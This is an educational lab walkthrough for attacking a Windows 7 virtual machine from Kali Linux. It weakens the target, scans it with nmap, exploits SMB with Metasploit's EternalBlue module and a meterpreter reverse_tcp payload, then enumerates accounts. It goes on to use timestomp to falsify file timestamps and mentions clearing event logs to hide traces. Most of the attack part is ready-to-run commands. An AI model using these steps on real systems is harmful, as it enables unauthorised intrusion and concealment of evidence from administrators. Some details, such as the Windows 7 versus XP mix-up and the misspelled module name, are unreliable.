DISCLAIMER
1. These steps are for educational purposes only and for use at your own network laboratory. If you use these steps without
consent from the network owner, you’re on your own.

2. I am not responsible for any issues/damages to hardware or software by using any of the software mentioned in this guide
or damages by following the steps…do so at your own risk. I have tested these steps myself and found no issues/damage to my
own systems. Also, I am not responsible for software links, software availability or versions differences.

3. You will need to have common Linux knowledge to be able to follow this guide as well as what an .iso file is; installing
and configuring a Linux distro in a VM environment, general VM knowledge, and basic DOS commands. I will not be covering
these steps in this short guide. This guide is NOT for people that have no idea how to install, remove, update/upgrade, and
configure Linux/Windows O/S or VMs. Google is your best friend and research is part of the job.

COMMONS COMMANDS TO KNOW:
  • ls		    - Lists Files (LS)
  • pwd		    - Prints the current path to screen
  • cd		    - Call Directory
  • ifconfig  - Displays local network information
  • shell     - Opens Windows CMD prompt

DEFAULT LOGINS:
  • Kali: root/toor

WHAT YOU’LL NEED FOR THIS EXERCISE:
  • A computer with minimum: 8GB RAM, 6 Core CPU and a HDD of 500GB (16GB best)
  • ISO file of Windows 7
  • ISO file of the latest Kali release (BIG)
  • OracleVirtualbox (free) or VMWare Workstation 12 or higher

******************************************************************************
NOTE: When using a VM make sure you change your resolution to the highest you can use without having any scroll bars on the
sides or the bottom of the screen.
******************************************************************************

VM SETUP:
1. Install the VM application you want, then install Kali and Windows XP as VMs.

2. Give the VMs:
  a. Windows = 1 CPU/2 Core, 2GB RAM, and 60GB of HDD space. (use more if you have 16GB or more of RAM)
  b. Kali = 1 CPU/2 Cores, 2GB RAM and 40GB HDD space. (use more if you have 16GB or more of RAM)

3. Maximize the GPU memory on both Kali (1GB) and XP (512MB).
  a. Do not use 3D on any of them.

4. Make sure both VMs networks are in NAT so they use the same network range. There is no need to be connected to the Internet
for this to work.

WINDOWS 7 SETUP:
1. Go to the target and on the Desktop create a folder named My Files.

2. Open the folder and right click in it. From the menu select New > Text Document
	a. Insert a blank text file
	b. Copy that file and make 2 more copies
	c. Rename them text2 and text3.txt

First we need to turn OFF the Firewall…I know what you’re thinking, but it needs to happen. Then, we need to turn ON the Audit
Logon Event that will recognize when someone else is in the system. This is off by default. This option and many more will be
ON if an administrator is good at their job.

The next thing we need to change is to allow users to connect remotely to this computer. And lastly we need to change the way
the users log on to the system.

To turn off the Firewall…
  1. Click: Start > Control Panel > Firewall
  2. Under the General tab select OFF then click OK

To turn on the Audit Logon Event…
  1. Click: Start > Control Panel > Administrative Tools > Local Security Policy
  2. Click: Local Policies > Audit Policy
  3. Select: Audit logon events and select both check boxes
  4. Close and go to Event Viewer
  5. Select: Security and live it open

Allow remote users…
  1. Click: Start > Control Panel > System
  2. Under the Remote tab check the Allow user to connect remotely to this computer checkbox, then click OK

Change user logon…
  1. Click: Start > Control Panel > User Accounts
  2. Click: Change the way users log on or off (if you haven't already)
  3. Uncheck the Use the Welcome screen checkbox

Now we’re set. Continue on to Kali VM.

ATTACK:
1. Find your Kali IP address…
  a. Type: ifconfig
    i. Take notes

2. Scan for live-hosts…
  a. Type: nmap –sn <target_ip >/24
    i. Annotate your findings like IPs and their services running if any

3. Select your target and scan for open ports in stealth mode…
  a. Type: nmap –sS –Pn <target_ip>
    i. Notice the SMB port service is running…we’ll use it on our attack

******************************************************************************
NOTE: Optional...you can scan for very detailed versions and o/s with:
• nmap -sV -A <target_ip>
******************************************************************************

4. Open a new terminal and run metasploit…
  a. Type: msfconsole
  b. Type: use exploit/windows/smb/ms17_10_eternalblue
    i. Have you used the TAB key to autocomplete a command?
  c. Type: set
    i. Look at your options…also use the show options if you cannot find the RHOST
  d. Type: set RHOST <target_ip>
    i. Type set again or show options to see the changes
  e. Type set payload windows/x64/meterpreter/reverse_tcp
  f. Type: run or exploit

5. Now wait for the process to finish...you should see the word WIN like so...

meterpreter >

******************************************************************************
NOTE: You’re in meterpreter, a command shell connecting you to your target.
******************************************************************************

1. In meterpreter, find out where you’re at this time...
  a. Type: pwd

2. Find some information about the target...
  a. Type: sysinfo
    i. Take notes

3. Find out the user accounts and when they were last accessed...
  a. Type: shell
	 i. To go into the cmd prompt of Windows
  b. Type: net help
	 i. To view all commands available
  c. Type: net user
	 i. To view current logged-in account in the target system
	 ii. Take notes
  d. Type: net user <username>
    i. Find the last time the use was logged-on
  e. Type: exit
	 i. You're back in meterpreter

******************************************************************************
NOTE: If theres an error or nothing happens while in the shell then use CTRL+C to terminate
and Y to exit back to meterpreter...then you can go back in to shell if you need to
******************************************************************************

4. In meterpreter, go to the My Files folder...
  a. Type: cd c:/user
  b. Type: pwd to find out the user's account named
  c. Type: the users account then continue to the Desktop and the Folder...
	 i. Example: c:/user/%username%/Desktop/My Files
	 ii. FYI...replace %username% with the actual account that is currently logged-in

5. If you're in the folder now...
  a. Type: timestomp text1.txt -v
	 i. Now you can see the MACE
   ii. MACE = Modified, Accessed, Created, Entry Modified

6. Change the time and date...
  a. Type: timestomp text1.txt -m "06/06/2016 12:30:25"

7. Check the date and time...
  a. Type: timestomp text1.txt -v
	 i. -a, -c, -e flags respectively
	 ii. -z changes all at the same time
	 iii. -f matches all values to another file, this way it looks more authentic
	 iv. -b removes all values
	 v. -r blanks out all values

******************************************************************************
NOTE: Several things here...
  a. You can use / in meterpreter and \ in shell for your paths in Windows
  b. You cannot change the entire MACE as this will give you away to the admins
******************************************************************************

8. I did not included it in this guide, but if you want to clear the Event Logs to hide traces
 of your acts then use the Maintain Persistence to Windows XP to learn to how.
